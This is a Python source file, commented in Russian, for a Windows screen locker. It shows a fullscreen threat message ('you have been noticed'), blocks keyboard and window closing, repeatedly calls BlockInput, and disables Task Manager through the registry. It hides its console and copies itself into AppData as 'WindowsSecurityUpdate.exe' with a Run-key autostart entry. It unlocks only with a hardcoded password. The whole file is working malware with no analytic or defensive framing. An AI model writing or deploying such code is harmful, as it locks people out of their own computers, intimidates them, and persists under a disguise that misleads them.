import os
import sys
import tkinter as tk
from tkinter import messagebox
import ctypes
import subprocess
import winreg as reg
from pathlib import Path

class FullscreenLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.password = "oleg2026"
        
        # Полный экран без рамок
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        
        # Блокировка всех комбинаций
        self.root.bind('<Key>', self.block_key)
        self.root.bind('<KeyPress>', self.block_key)
        self.root.bind('<KeyRelease>', self.block_key)
        self.root.bind('<Alt-Key>', self.block_key)
        self.root.bind('<Control-Key>', self.block_key)
        self.root.bind('<Alt-Control-Key>', self.block_key)
        self.root.bind('<Alt-Shift-Key>', self.block_key)
        self.root.bind('<Control-Shift-Key>', self.block_key)
        self.root.bind('<Alt-Control-Shift-Key>', self.block_key)
        
        # Блокировка закрытия
        self.root.protocol("WM_DELETE_WINDOW", self.block_close)
        self.root.bind('<Escape>', self.block_key)
        self.root.bind('<F4>', self.block_key)
        self.root.bind('<Alt-F4>', self.block_key)
        self.root.bind('<Control-Alt-Delete>', self.block_key)
        self.root.bind('<Control-Shift-Escape>', self.block_key)
        self.root.bind('<Alt-Tab>', self.block_key)
        
        # ASCII Art
        ascii_art = """
        ██╗   ██╗ █████╗ ███████╗     ███████╗ █████╗ ███╗   ███╗███████╗████████╗██╗██╗     ██╗
        ██║   ██║██╔══██╗██╔════╝     ██╔════╝██╔══██╗████╗ ████║██╔════╝╚══██╔══╝██║██║     ██║
        ██║   ██║███████║███████╗     █████╗  ███████║██╔████╔██║█████╗     ██║   ██║██║     ██║
        ╚██╗ ██╔╝██╔══██║╚════██║     ██╔══╝  ██╔══██║██║╚██╔╝██║██╔══╝     ██║   ██║██║     ██║
         ╚████╔╝ ██║  ██║███████║     ██║     ██║  ██║██║ ╚═╝ ██║███████╗   ██║   ██║███████╗███████╗
          ╚═══╝  ╚═╝  ╚═╝╚══════╝     ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝╚══════╝╚══════╝
        
        ╔══════════════════════════════════════════════════════════════════════════════════╗
        ║                     ⚠️  ВАС ЗАМЕТИЛИ ⚠️                                          ║
        ║                    Ваша активность зафиксирована                                 ║
        ║                                                                                  ║
        ║              Введите пароль для разблокировки системы                            ║
        ╚══════════════════════════════════════════════════════════════════════════════════╝
        """
        
        # Основной фрейм
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True, fill='both')
        
        # ASCII Art Label
        label_ascii = tk.Label(main_frame, text=ascii_art, font=('Courier', 10), 
                               fg='red', bg='black', justify='center')
        label_ascii.pack(pady=50)
        
        # Поле ввода пароля
        self.password_entry = tk.Entry(main_frame, font=('Arial', 20), 
                                       show='*', width=20, bg='gray20', 
                                       fg='white', insertbackground='white')
        self.password_entry.pack(pady=20)
        self.password_entry.focus_set()
        
        # Кнопка разблокировки
        unlock_btn = tk.Button(main_frame, text="РАЗБЛОКИРОВАТЬ", 
                               font=('Arial', 14), bg='darkred', fg='white',
                               activebackground='red', activeforeground='white',
                               command=self.check_password, width=20, height=2)
        unlock_btn.pack(pady=20)
        
        # Привязка Enter к проверке пароля
        self.password_entry.bind('<Return>', lambda event: self.check_password())
        
        # Запуск блокировки ввода
        self.block_input()
        
    def block_key(self, event):
        """Блокировка всех клавиш"""
        # Разрешаем только ввод в поле пароля
        if event.widget == self.password_entry:
            # Разрешаем только буквы, цифры и backspace
            if event.keysym in ('BackSpace', 'Return') or len(event.char) == 1:
                return
        return "break"
    
    def block_close(self):
        """Блокировка закрытия окна"""
        pass
    
    def check_password(self):
        """Проверка пароля"""
        if self.password_entry.get() == self.password:
            messagebox.showinfo("Успех", "Доступ разрешен")
            self.root.quit()
            self.root.destroy()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль")
            self.password_entry.delete(0, 'end')
    
    def block_input(self):
        """Блокировка системных комбинаций"""
        # Отключаем Alt+F4 и другие системные комбинации
        try:
            # Блокируем Alt+Tab
            ctypes.windll.user32.BlockInput(True)
        except:
            pass
        
        # Отключаем диспетчер задач
        try:
            reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            reg.SetValueEx(reg_key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
            reg.CloseKey(reg_key)
        except:
            pass
        
        self.root.after(100, self.block_input)
    
    def run(self):
        """Запуск блокировщика"""
        self.root.mainloop()

def add_to_startup():
    """Добавление в автозагрузку"""
    try:
        # Путь к текущему файлу
        file_path = sys.argv[0]
        
        # Копируем в AppData
        appdata = os.getenv('APPDATA')
        new_path = os.path.join(appdata, 'WindowsSecurityUpdate.exe')
        
        # Копируем файл
        if file_path != new_path:
            import shutil
            shutil.copy2(file_path, new_path)
        
        # Добавляем в реестр
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, "WindowsSecurityUpdate", 0, reg.REG_SZ, new_path)
            
    except:
        pass

def hide_console():
    """Скрытие консоли"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

if __name__ == "__main__":
    # Скрываем консоль
    hide_console()
    
    # Добавляем в автозагрузку
    add_to_startup()
    
    # Запускаем блокировщик
    locker = FullscreenLocker()
    locker.run()